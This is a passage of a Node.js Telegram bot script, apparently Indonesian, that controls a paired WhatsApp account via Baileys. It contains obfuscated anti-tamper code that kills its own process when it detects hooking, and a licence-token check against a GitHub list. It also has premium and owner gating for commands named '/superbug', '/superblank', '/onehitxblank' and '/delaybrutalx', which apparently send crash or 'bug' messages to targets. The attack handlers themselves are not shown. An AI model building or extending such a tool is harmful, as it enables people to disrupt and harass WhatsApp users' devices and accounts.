lp/// GXION NIH DEKSS DEVELOPER @Bawzhhhh
(function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  const nativePattern = /\[native code\]/
  const proxyPattern = /Proxy|apply\(target/
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i
  
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('')
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93])
  const exitStr = buildStr([101,120,105,116])
  const killStr = buildStr([107,105,108,108])
  const httpsStr = buildStr([104,116,116,112,115])
  const httpStr = buildStr([104,116,116,112])
  
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn
  
  try {
    nativeExit = process[exitStr].bind(process)
    nativeKill = process[killStr].bind(process)
    nativeOn = process.on.bind(process)
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync
    nativePid = process.pid
  } catch(e) {
    nativeExit = process.exit
    nativeKill = process.kill
    nativePid = process.pid
  }
  
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })()
  
  try {
    const M = require(buildStr([109,111,100,117,108,101]))
    const reqStr = M.prototype.require.toString()
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const exitFn = process[exitStr]
    const exitCode = exitFn.toString()
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override')
      forceKill()
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const killFn = process[killStr]
    const killCode = killFn.toString()
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const onFn = process.on
    const onCode = onFn.toString()
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const axios = require('axios')
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected')
      forceKill()
    }
  } catch(e) {}
  
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest']
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i])
          forceKill()
        }
      } catch(e) {}
    }
  })
  checkGlobals()
  
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]))
    const execStr = cp.execSync.toString()
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString()
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected')
        forceKill()
      }
    }
  } catch(e) {}
  
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr)
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter')
      forceKill()
    }
  } catch(e) {}
  
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr)
        const reqFunc = https.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr)
        const reqFunc = http.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  setTimeout(() => {
    checkHttps()
    checkHttp()
  }, 500)
  
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected')
        forceKill()
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]))
        const reqStr = M.prototype.require.toString()
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr]
        const exitCode = exitFn.toString()
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr]
        const killCode = killFn.toString()
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const axios = require('axios')
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active')
          forceKill()
        }
      } catch(e) {}
      
      checkHttps()
      checkHttp()
      checkGlobals()
    }
  })()
  
  setInterval(monitor, 2000)
  setTimeout(monitor, 100)
  
})()

const { Telegraf, Markup, session } = require("telegraf");
const fs = require("fs");
const os = require("os");
const chalk = require("chalk");
const readline = require("readline");
const path = require("path");
const ms = require("ms");
const https = require("https");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const axios = require("axios");
const FormData = require("form-data");
const { TOKEN_GINXJAL } = require("./config");
const BOT_TOKEN = TOKEN_GINXJAL;

const MODE_FILE = "./Tools/mode.json";
const crypto = require("crypto");

const premiumFile = "./database/premiumuser.json";
const adminFile = "./database/adminuser.json";
const ownerFile = "./database/owneruser.json";
const GROUP_FILE = "./Tools/groupmode.json";
const antiFotoFile = "./Tools/antifoto.json"
const safeFile = "./Tools/safeGroups.json";
const antiVideoFile = "./Tools/antivideo.json"
const premiumGroupsFile = "./Tools/premiumGroups.json";

const TOKENS_FILE = "./tokens.json";

const sessionPath = "./session";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

global.pairingMessage = null;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let senderUsers = [];
let hasConnectedOnce = false;
let reconnectAttempts = 0;
let waConnected = false;

const maxReconnect = 10;
const usePairingCode = true;

/////// ////////////////
function getGroupMode() {
  try {

    if (!fs.existsSync(".mode")) {
      fs.mkdirSync(".mode")
    }

    if (!fs.existsSync(GROUP_FILE)) {
      fs.writeFileSync(
        GROUP_FILE,
        JSON.stringify({ group: "off" }, null, 2)
      )
      return "off"
    }

    const data = JSON.parse(fs.readFileSync(GROUP_FILE))
    return data.group || "off"

  } catch (err) {
    console.log("❌ Gagal membaca group mode:", err)
    return "off"
  }
}
//////////////////////////////////////
function setGroupMode(group) {
  if (!["on", "off"].includes(group)) return

  const data = { group }

  fs.writeFileSync(GROUP_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Group mode diset ke: ${group}`)
}
//////////////////////////////////////
const VALID_MODES = ["self", "public"]

function getMode() {
  try {
    if (!fs.existsSync(MODE_FILE)) {
      fs.writeFileSync(MODE_FILE, JSON.stringify({ mode: "self" }, null, 2))
      return "self"
    }

    const data = JSON.parse(fs.readFileSync(MODE_FILE))
    return data.mode || "self"

  } catch (err) {
    console.log("❌ Gagal membaca mode:", err)
    return "self"
  }
}
//////////////////////////////////////
function setMode(mode) {
  if (!VALID_MODES.includes(mode)) return

  const data = { mode }

  currentMode = mode
  fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Mode bot diset ke: ${mode}`)
}

let currentMode = getMode()
//////////////
const spamLimit = new Map()
const SPAM_WINDOW = 5000
const SPAM_MAX = 4

function antiSpam(ctx) {
  if (!ctx.from?.id) return true

  const userId = ctx.from.id
  const now = Date.now()

  if (!spamLimit.has(userId)) {
    spamLimit.set(userId, [])
  }

  let timestamps = spamLimit.get(userId).filter(t => now - t < SPAM_WINDOW)

  timestamps.push(now)
  spamLimit.set(userId, timestamps)

  if (timestamps.length > SPAM_MAX) {
    return ctx.reply("🚫 Spam terdeteksi!")
  }

  setTimeout(() => spamLimit.delete(userId), SPAM_WINDOW + 1000)

  return true
}
///// ---- ( DATE ) ---- /////
function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
}

///// ---- ( RUNTIME & MEMORY ) ---- /////
function runtime(seconds) {
  seconds = Number(seconds);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor(seconds % 3600 / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

function memory() {
  return (process.memoryUsage().rss / 1024 / 1024).toFixed(0) + " MB";
}
// ================= SECURITY =================//

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Unbandfoul/gxion/refs/heads/main/tokens.json";////ganti jadi Raw luh



async function fetchValidTokens() {
  try {
    const { data } = await axios.get(GITHUB_TOKEN_LIST_URL);
    return Array.isArray(data.tokens) ? data.tokens : [];
  } catch (err) {
    console.log(chalk.red("❌ Gagal mengambil token dari GitHub"));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token..."));

  const validTokens = await fetchValidTokens();

if (!validTokens.length) {
  console.log(`
██████╗ ██╗  ██╗██╗ ██████╗ ███╗   ██╗
  ██╔════╝ ╚██╗██╔╝██║██╔═══██╗████╗  ██║
  ██║  ███╗ ╚███╔╝ ██║██║   ██║██╔██╗ ██║
  ██║   ██║ ██╔██╗ ██║██║   ██║██║╚██╗██║
  ╚██████╔╝██╔╝ ██╗██║╚██████╔╝██║ ╚████║
   ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝

   • Creator : @Bawzhhh
   • Script  : Gxion NΞW ERA
   • System  : Auto Update

   ── ACCESS DENIED ──

   × Token tidak terdaftar
   × Aktivitas mencurigakan terdeteksi

   GXION • SECURITY SISTEM
`);
  process.exit(1);
}

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(""));
    process.exit(1);
  }

  console.log(chalk.green("✅ Token valid"));
  startBot();
}

function startBot() {
  console.log(chalk.red(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
╔════════════════════╗
  WAITING FOR CONNECTION...
╚════════════════════╝`))
}

validateToken()

/// ------ Start WhatsApp Session ------ ///
const startSesi = async () => {
  try {
    if (isStarting) return;
    isStarting = true;

    console.log(chalk.yellow(`
╔════════════════════╗
 BOT CONNECTED SYSTEM READY
╚════════════════════╝
`));

    if (sock?.ev) {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    });

    sock.ev.on("creds.update", saveCreds);

    console.log("🔐 Siap pairing / reconnect...");

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const reason = lastDisconnect?.error?.output?.statusCode;

      if (connection === "connecting") {
        console.log("🔄 Connecting...");
      }

      if (connection === "open") {
        isWhatsAppConnected = true;
        isStarting = false;
        hasConnectedOnce = true;
        reconnectAttempts = 0;

        linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

        console.log(chalk.yellow(`        
╔════════════════════╗
  GXION INFORMATION INTERNAL
╚════════════════════╝

▸ Creator  : @Bawzhhh
▸ Script   : Gxion NΞW ERA
▸ System   : Auto Update
▸ Status   : Online ✓
▸ Device   : ${linkedWhatsAppNumber}

──────────────
SYSTEM DATABASE GXION
──────────────
`));
       
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {

            await bot.telegram.editMessageCaption(
              global.pairingMessage.chatId,
              global.pairingMessage.messageId,
              undefined,
`
<blockquote><i>SUKSES MENGHUBUNGKAN KE WHATSAPP !!</i></blockquote>
<b>Nomor Target Pairing</b> : ${linkedWhatsAppNumber}
`,
              { parse_mode: "HTML" }
            );

          } catch (err) {
            console.log("❌ Gagal edit pesan:", err.message);
          }

          global.pairingMessage = null;
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        isStarting = false;

        console.log("❌ Disconnected:", reason);

        if (reason === DisconnectReason.loggedOut || reason === 401) {
          console.log("🚫 Session logout / invalid");

          deleteSession();
          global.pairingMessage = null;
          reconnectAttempts = 0;
          return;
        }

        reconnectAttempts++;

        if (reconnectAttempts > maxReconnect) {
          console.log("⛔ Stop reconnect (limit)");
          return;
        }

        const delay = Math.min(5000 * reconnectAttempts, 30000);

        console.log(`♻️ Reconnect dalam ${delay / 1000}s`);

        setTimeout(() => startSesi(), delay);
      }
    });

  } catch (err) {
    console.log("❌ Error start session:", err);
    isStarting = false;
  }
};
///////////////////////////////////////////////////
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    return ctx.reply("❌ ☇ Sender tidak terhubung");
  }
  return next();
};

//////////////////////////////////////
const loadJSON = (file) => {
  try {
    if (!fs.existsSync(file)) return [];

    const data = fs.readFileSync(file, "utf8");
    if (!data) return [];

    return JSON.parse(data);
  } catch (err) {
    console.log("⚠️ JSON corrupt:", file);
    return [];
  }
};
//////////////////////////////////////
const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("❌ Failed save JSON:", file, err.message);
  }
};

//////////////////////////////////////
function deleteSession() {
  try {
    if (!sessionPath || !fs.existsSync(sessionPath)) {
      console.log("⚠️ Session not found.");
      return false;
    }

    fs.rmSync(sessionPath, { recursive: true, force: true });
    console.log("🗑️ Session deleted successfully.");
    return true;

  } catch (err) {
    console.log("❌ Failed delete session:", err.message);
    return false;
  }
}
//////////////////////////////////////
module.exports = {
  startSesi,
  checkWhatsAppConnection,
  loadJSON,
  saveJSON,
  deleteSession,
};
//// Variabel ///
let antiCulik = true;
let autoReject = false; 
let pendingGroups = new Map();
let whitelistGroups = []; 
//////////////////////////////////////
let ownerUsers = loadOwner();
let premiumUsers = loadJSON(premiumFile);
let adminList    = [];

loadAdmins();

//////////////////////////////////////

/// ---- OWNER ---- ///
const checkOwner = (ctx, next) => {
  const id = ctx.from.id.toString();

  if (!ownerUsers.includes(id)) {
    return ctx.reply("❌ ☇ Akses hanya untuk owner");
  }

  return next();
};
/// ---- ADMIN ---- ///
const checkAdmin = (ctx, next) => {
  const id = ctx.from.id.toString();

  if (
    !adminList.includes(id) &&
    !ownerUsers.includes(id)
  ) {
    return ctx.reply("❌ ☇ Akses hanya untuk admin");
  }

  return next();
};
const checkAllPremium = (ctx, next) => {
  const id = ctx.from.id.toString();

  
  if (premiumUsers.includes(id)) {
    return next();
  }

 
  if (ctx.chat.type !== "private" && isGroupPremium(ctx.chat.id)) {
    return next();
  }

  return ctx.reply("❌ ☇ Akses hanya untuk premium");
};
/// Anti culik ///
function isSafeGroup(groupId) {
  return whitelistGroups.includes(groupId.toString());
}

function loadSafe() {
  try {
    if (!fs.existsSync(safeFile)) return [];
    return JSON.parse(fs.readFileSync(safeFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function saveSafe(data) {
  fs.writeFileSync(safeFile, JSON.stringify(data, null, 2));
}

//// Group prem ////
function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
//////////
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}
//////////
function isGroupPremium(groupId) {
  return loadPremiumGroups().includes(groupId.toString());
}
/// ---- ADD ADMIN ---- ///
function addAdmin(userId) {
  userId = userId.toString();

  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
}

/// ---- REMOVE ADMIN ---- ///
function removeAdmin(userId) {
  userId = userId.toString();

  adminList = adminList.filter(id => id !== userId);
  saveAdmins();
}

/// ---- SAVE ADMIN ---- ///
function saveAdmins() {
  try {
    fs.writeFileSync("./database/admins.json", JSON.stringify(adminList, null, 2));
  } catch (err) {
    console.log("❌ Gagal save admin:", err.message);
  }
}

/// ---- LOAD ADMIN ---- ///
function loadAdmins() {
  try {
    if (!fs.existsSync("./database/admins.json")) {
      adminList = [];
      return;
    }

    const data = fs.readFileSync("./database/admins.json", "utf8");

   
    adminList = JSON.parse(data || "[]").map(id => id.toString());

  } catch (err) {
    console.log("⚠️ Gagal load admin:", err.message);
    adminList = [];
  }
}
/// ---- SLEEP ---- ///
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/// ---- CHECK PREMIUM ---- ///
function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

/// ---- CHECK OWNER ---- ///
function isOwner(id) {
  return ownerUsers.includes(id.toString());
}

/// ---- LOAD OWNER ---- ///
function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
/// ------ Check Sender ------- \\\
function isSender(userId) {
  return senderUsers.includes(String(userId));
}
// ================= ANTI FOTO =============== //
function loadAntiFoto() {
  try {
    if (!fs.existsSync(antiFotoFile)) return []
    return JSON.parse(fs.readFileSync(antiFotoFile))
  } catch {
    return []
  }
}


function saveAntiFoto(data) {
  fs.writeFileSync(antiFotoFile, JSON.stringify(data, null, 2))
}

let antiFotoGroups = loadAntiFoto()

/// ------- ANTI VIDIO ------- ///
function loadAntiVideo() {
  try {
    if (!fs.existsSync(antiVideoFile)) return []
    return JSON.parse(fs.readFileSync(antiVideoFile))
  } catch {
    return []
  }
}

function saveAntiVideo(data) {
  fs.writeFileSync(antiVideoFile, JSON.stringify(data, null, 2))
}

let antiVideoGroups = loadAntiVideo()
/// ---- GROUP ONLY ---- ///
bot.use((ctx, next) => {
  const groupMode = getGroupMode();

  if (groupMode === "on" && ctx.chat.type === "private") {
    return ctx.reply(`
🔒 𝐆𝐑𝐎𝐔𝐏 𝐎𝐍𝐋𝐘 𝐌𝐎𝐃𝐄

Bot ini hanya bisa digunakan di dalam group.
Silakan gunakan perintah di group.
`);
  }

  return next();
});
/// ---- SELF / PUBLIC MODE ---- ///
bot.use((ctx, next) => {
  const mode = getMode();

  if (mode === "self" && !isOwner(ctx.from.id)) {

    if (ctx.callbackQuery) {
      return ctx.answerCbQuery("🔒 BOT DI KUNCI OWNER", { show_alert: true });
    }

    return; 
  }

  return next();
});
/// ---- COOLDOWN ---- ///
function parseCooldown(input) {
  const match = input.match(/^(\d+)([dhms])$/);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2];

  switch (unit) {
    case "d": // detik
      return value * 1000;

    case "m": // menit
      return value * 60 * 1000;

    case "h": // jam
      return value * 60 * 60 * 1000;

    case "s": // hari
      return value * 24 * 60 * 60 * 1000;

    default:
      return null;
  }
}


let COOLDOWN_TIME = 1;
let COOLDOWN_TEXT = "1d";
const cooldowns = new Map();

function checkCooldown(ctx, next) {
  if (!ctx.from?.id) return next();


  if (isOwner(ctx.from.id)) return next();


  if (COOLDOWN_TIME === 0) return next();

  const userId = String(ctx.from.id);
  const now = Date.now();

  const expireTime = cooldowns.get(userId) || 0;

  if (now < expireTime) {
    
    if (!cooldowns.get(userId + "_msg")) {
      cooldowns.set(userId + "_msg", true);

      setTimeout(() => cooldowns.delete(userId + "_msg"), 3000);

      return ctx.reply(`⏳ Tunggu ${COOLDOWN_TEXT}!`);
    }
    return;
  }

  
  cooldowns.set(userId, now + COOLDOWN_TIME);

  return next();
}
/// ========== FORCE SUBSCRIBE SYSTEM (NO PHOTO VERSION) ==========

let REQUIRED_CHANNEL_USERNAME = "@setchannel";
const requiredChannelFile = "./requiredChannel.json";


// ========= LOAD CHANNEL =========
function loadRequiredChannel() {
  try {
    if (fs.existsSync(requiredChannelFile)) {
      const data = JSON.parse(
        fs.readFileSync(requiredChannelFile)
      );

      if (data?.username) {
        REQUIRED_CHANNEL_USERNAME = data.username;
      }
    }
  } catch (e) {
    console.log("Failed load channel:", e.message);
  }
}

loadRequiredChannel();


// ========= SAVE CHANNEL =========
function saveRequiredChannel() {
  try {
    fs.writeFileSync(
      requiredChannelFile,
      JSON.stringify(
        {
          username: REQUIRED_CHANNEL_USERNAME,
        },
        null,
        2
      )
    );
  } catch (e) {
    console.log("Failed save channel:", e.message);
  }
}


// ========= CHECK JOIN =========
async function isJoinedChannel(userId) {
  try {

    // bypass kalau belum set
    if (
      !REQUIRED_CHANNEL_USERNAME ||
      REQUIRED_CHANNEL_USERNAME === "@setchannel"
    ) {
      return true;
    }

    const member = await bot.telegram.getChatMember(
      REQUIRED_CHANNEL_USERNAME,
      userId
    );

    return [
      "member",
      "administrator",
      "creator"
    ].includes(member.status);

  } catch (err) {

    console.log("Check join error:", err.message);

    return false;
  }
}


// ========= SEND FORCE SUB =========
async function sendForceSubscribeMessage(ctx) {

  const text = `
<blockquote>⚠️ SYSTEM LOOCKED ⚠️</blockquote>

Halo kak/bang, untuk menggunakan bot ini kamu wajib join channel kami terlebih dahulu.

Jika sudah join channel, silahkan tekan button <b>VERIFIED</b> agar sistem mengecek status akun kamu dan membuka akses bot.

<blockquote>🚨 TATA CARA SET CHANNEL</blockquote>
🪧 Example :
<code>/setchannel @NamaChannel</code>

<code>(Only Owner Command)</code>
`;

  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "JOIN CHANNEL",
            url: `https://t.me/${REQUIRED_CHANNEL_USERNAME.replace("@", "")}`,
            style: "danger",
            icon_custom_emoji_id: "6098421155897545579"
          }
        ],
        [
          {
            text: "VERIFIED",
            callback_data: "check_join",
            style: "primary",
            icon_custom_emoji_id: "6098003603471996036"
          }
        ]
      ]
    }
  };

  try {

    // anti spam 15 detik
    if (ctx.session?.forceSubSent) return;

    if (ctx.session) {
      ctx.session.forceSubSent = true;

      setTimeout(() => {
        ctx.session.forceSubSent = false;
      }, 15000);
    }

    return await ctx.reply(
      text,
      {
        parse_mode: "HTML",
        ...keyboard
      }
    );

  } catch (err) {
    console.log("Force sub error:", err.message);
  }
}


// ========= CALLBACK VERIFY =========
bot.action("check_join", async (ctx) => {

  try {
    await ctx.answerCbQuery("Checking...");
  } catch {}

  const joined = await isJoinedChannel(ctx.from.id);

  if (!joined) {
    return ctx.reply(
      "❌ Kamu belum join channel kami."
    );
  }

  try {

    await ctx.editMessageText(
      "✅ Verifikasi berhasil.\nSekarang kamu bisa menggunakan bot."
    );

  } catch {

    try {
      await ctx.reply(
        "✅ Verifikasi berhasil.\nSekarang kamu bisa menggunakan bot."
      );
    } catch {}
  }
});


// ========= PROTECTED COMMAND =========
const protectedCommands = [

  "/start",
  "/addprem",
  "/addadmin",
  "/addowner",
  "/xmonroe",
  "/balancedxlay",
  "/flowerxdelay",
  "/velixiry",
  "/superbug",
  "/bugsxios",
  "/superblank",
  "/onehitxblank",
  "/xtlz",
  "/xcombo",
  "/delaybrutalx",
  "/testbug",

];


// ========= MIDDLEWARE =========
bot.use(async (ctx, next) => {

  try {

    if (!ctx.from) {
      return next();
    }

    const text = ctx.message?.text || "";

    // allow owner command
    if (text.startsWith("/setchannel")) {
      return next();
    }

    // cek apakah command diproteksi
    const isProtected =
      protectedCommands.some(cmd =>
        text.startsWith(cmd)
      );

    // bukan command protected
    if (!isProtected) {
      return next();
    }

    const joined = await isJoinedChannel(
      ctx.from.id
    );

    // belum join
    if (!joined) {

      await sendForceSubscribeMessage(ctx);

      return;
    }

    // lanjut command
    return next();

  } catch (err) {

    console.log("Middleware error:", err.message);

    return;
  }
});

// ========= SET CHANNEL =========
bot.command(
  "setchannel",
  checkOwner,
  checkAdmin,
  async (ctx) => {

    try {

      const args = ctx.message.text.split(" ");

      if (args.length < 2) {
        return ctx.reply(
          "🪧 ☇ Example: /setchannel @NamaChannel"
        );
      }

      let newChannel = args[1];

      if (!newChannel.startsWith("@")) {
        newChannel = "@" + newChannel;
      }

      // validasi channel
      await bot.telegram.getChat(newChannel);

      REQUIRED_CHANNEL_USERNAME = newChannel;

      saveRequiredChannel();

      return ctx.reply(`
✅ ☇ Successfully Setting Channel to: ${REQUIRED_CHANNEL_USERNAME}
`);

    } catch (err) {

      return ctx.reply(
        "❌ ☇ Channel tidak tersedia, pastikan bot sudah di masukan ke dalam Channel dan menjadi Admin Channel setelah itu /setchannel kembali untuk mengatur Channel"
      );
    }
  }
);

// ================= IMAGES =================
const IMAGES = {
  home: "https://files.catbox.moe/xbw52q.jpg"
};

// ================= CACHE MESSAGE =================
const pageCache = new Map();

// ================= DISCO =================
const discoStyles = ["primary", "success", "danger"];
let discoIndex = 0;

// ================= ACTIVE MENUS =================
const activeMenus = new Map();

// ================= CLICK COOLDOWN =================
const clickCooldown = new Map();

// ================= GET COLOR =================
function getDiscoColor() {
  return discoStyles[discoIndex];
}

// ================= AUTO DISCO =================
setInterval(async () => {

  discoIndex++;
  if (discoIndex >= discoStyles.length) {
    discoIndex = 0;
  }

  const discoColor = getDiscoColor();

  // pake Promise.all biar lebih ringan
  await Promise.all(
    [...activeMenus.entries()].map(async ([msgId, data]) => {

      try {

        const {
          ctx,
          keyboardBuilder
        } = data;

        const keyboard = keyboardBuilder(discoColor);

        await ctx.telegram.editMessageReplyMarkup(
          ctx.chat.id,
          msgId,
          undefined,
          {
            inline_keyboard: keyboard
          }
        ).catch(() => {});

      } catch {}
    })
  );

}, 2500); // jangan terlalu cepet njir, telegram bisa flood

// ================= EDIT MENU =================
async function editMenu(ctx, caption, keyboard, page, keyboardBuilder) {

  try {

    // ================= CALLBACK =================
    if (ctx.callbackQuery) {

      const msgId = ctx.callbackQuery.message.message_id;
      const cacheKey = `${msgId}_${page}`;

      // ================= ANTI SPAM PAGE =================
      if (pageCache.has(cacheKey)) {
        return ctx.answerCbQuery().catch(() => {});
      }

      pageCache.set(cacheKey, true);

      setTimeout(() => {
        pageCache.delete(cacheKey);
      }, 700);

      await ctx.answerCbQuery().catch(() => {});

      // ================= EDIT MESSAGE =================
      try {

        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msgId,
          undefined,
          caption,
          {
            parse_mode: "HTML",
            reply_markup: {
